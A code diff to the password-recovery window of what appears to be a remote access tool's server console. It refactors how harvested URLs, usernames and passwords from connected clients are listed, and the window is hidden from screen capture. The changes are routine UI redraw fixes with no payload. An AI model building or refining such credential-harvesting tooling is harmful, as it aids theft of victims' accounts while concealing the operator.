@@ -38,6 +38,36 @@ namespace Pulsar.Server.Forms
             Password = "N/A"
         };
 
+        // ------------------------ RedrawScope Fix ------------------------
+        internal readonly struct RedrawScope : IDisposable
+        {
+            private readonly Control _ctl;
+            private readonly IntPtr _handle;
+
+            [System.Runtime.InteropServices.DllImport("user32.dll")]
+            private static extern IntPtr SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);
+
+            private const int WM_SETREDRAW = 0x0B;
+
+            public RedrawScope(Control c)
+            {
+                _ctl = c;
+                _handle = c.IsHandleCreated ? c.Handle : IntPtr.Zero;
+                if (_handle != IntPtr.Zero)
+                    SendMessage(_handle, WM_SETREDRAW, 0, 0); // stop redraw
+            }
+
+            public void Dispose()
+            {
+                if (_handle != IntPtr.Zero)
+                {
+                    SendMessage(_handle, WM_SETREDRAW, 1, 0); // resume redraw
+                    _ctl.Invalidate();
+                }
+            }
+        }
+        // -----------------------------------------------------------------
+
         /// <summary>
         /// Initializes a new instance of the <see cref="FrmPasswordRecovery"/> class using the given clients.
         /// </summary>
@@ -51,7 +81,7 @@ namespace Pulsar.Server.Forms
             InitializeComponent();
 
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
         }
 
         /// <summary>
@@ -111,51 +141,79 @@ namespace Pulsar.Server.Forms
         {
             try
             {
-                if (accounts == null || accounts.Count == 0) // no accounts found
+                using (new RedrawScope(lstPasswords))
                 {
-                    var lvi = new ListViewItem { Tag = _noResultsFound, Text = clientIdentifier };
-
-                    lvi.SubItems.Add(_noResultsFound.Url); // URL
-                    lvi.SubItems.Add(_noResultsFound.Username); // User
-                    lvi.SubItems.Add(_noResultsFound.Password); // Pass
-
-                    var lvg = GetGroupFromApplication(_noResultsFound.Application);
-
-                    if (lvg == null) // create new group
+                    lstPasswords.BeginUpdate();
+                    try
                     {
-                        lvg = new ListViewGroup
-                        { Name = _noResultsFound.Application, Header = _noResultsFound.Application };
-                        lstPasswords.Groups.Add(lvg); // add the new group
+                        if (accounts == null || accounts.Count == 0) // no accounts found
+                        {
+                            var lvi = new ListViewItem
+                            {
+                                Tag = _noResultsFound,
+                                Text = clientIdentifier
+                            };
+
+                            lvi.SubItems.Add(_noResultsFound.Url);      // URL
+                            lvi.SubItems.Add(_noResultsFound.Username); // User
+                            lvi.SubItems.Add(_noResultsFound.Password); // Pass
+
+                            var lvg = GetGroupFromApplication(_noResultsFound.Application);
+
+                            if (lvg == null) // create new group
+                            {
+                                lvg = new ListViewGroup
+                                {
+                                    Name = _noResultsFound.Application,
+                                    Header = _noResultsFound.Application
+                                };
+                                lstPasswords.Groups.Add(lvg); // add the new group
+                            }
+
+                            lvi.Group = lvg;
+                            lstPasswords.Items.Add(lvi);
+                        }
+                        else
+                        {
+                            var items = new List<ListViewItem>();
+                            foreach (var acc in accounts)
+                            {
+                                var lvi = new ListViewItem
+                                {
+                                    Tag = acc,
+                                    Text = clientIdentifier
+                                };
+
+                                lvi.SubItems.Add(acc.Url);      // URL
+                                lvi.SubItems.Add(acc.Username); // User
+                                lvi.SubItems.Add(acc.Password); // Pass
+
+                                var lvg = GetGroupFromApplication(acc.Application);
+
+                                if (lvg == null) // create new group
+                                {
+                                    lvg = new ListViewGroup
+                                    {
+                                        Name = acc.Application.Replace(" ", string.Empty),
+                                        Header = acc.Application
+                                    };
+                                    lstPasswords.Groups.Add(lvg); // add the new group
+                                }
+
+                                lvi.Group = lvg;
+                                items.Add(lvi);
+                            }
+
+                            lstPasswords.Items.AddRange(items.ToArray());
+                        }
+
+                        UpdateRecoveryCount();
                     }
-
-                    lvi.Group = lvg;
-                    lstPasswords.Items.Add(lvi);
-                    return;
-                }
-
-                var items = new List<ListViewItem>();
-                foreach (var acc in accounts)
-                {
-                    var lvi = new ListViewItem { Tag = acc, Text = clientIdentifier };
-
-                    lvi.SubItems.Add(acc.Url); // URL
-                    lvi.SubItems.Add(acc.Username); // User
-                    lvi.SubItems.Add(acc.Password); // Pass
-
-                    var lvg = GetGroupFromApplication(acc.Application);
-
-                    if (lvg == null) // create new group
+                    finally
                     {
-                        lvg = new ListViewGroup { Name = acc.Application.Replace(" ", string.Empty), Header = acc.Application };
-                        lstPasswords.Groups.Add(lvg); // add the new group
+                        lstPasswords.EndUpdate();
                     }
-
-                    lvi.Group = lvg;
-                    items.Add(lvi);
                 }
-
-                lstPasswords.Items.AddRange(items.ToArray());
-                UpdateRecoveryCount();
             }
             catch
             {
@@ -268,18 +326,42 @@ namespace Pulsar.Server.Forms
 
         private void clearAllToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            lstPasswords.Items.Clear();
-            lstPasswords.Groups.Clear();
+            using (new RedrawScope(lstPasswords))
+            {
+                lstPasswords.BeginUpdate();
+                try
+                {
+                    lstPasswords.Items.Clear();
+                    lstPasswords.Groups.Clear();
+                }
+                finally
+                {
+                    lstPasswords.EndUpdate();
+                }
+            }
 
             UpdateRecoveryCount();
         }
 
         private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            for (int i = 0; i < lstPasswords.SelectedItems.Count; i++)
+            using (new RedrawScope(lstPasswords))
             {
-                lstPasswords.Items.Remove(lstPasswords.SelectedItems[i]);
+                lstPasswords.BeginUpdate();
+                try
+                {
+                    for (int i = 0; i < lstPasswords.SelectedItems.Count; i++)
+                    {
+                        lstPasswords.Items.Remove(lstPasswords.SelectedItems[i]);
+                    }
+                }
+                finally
+                {
+                    lstPasswords.EndUpdate();
+                }
             }
+
+            UpdateRecoveryCount();
         }
 
         #endregion
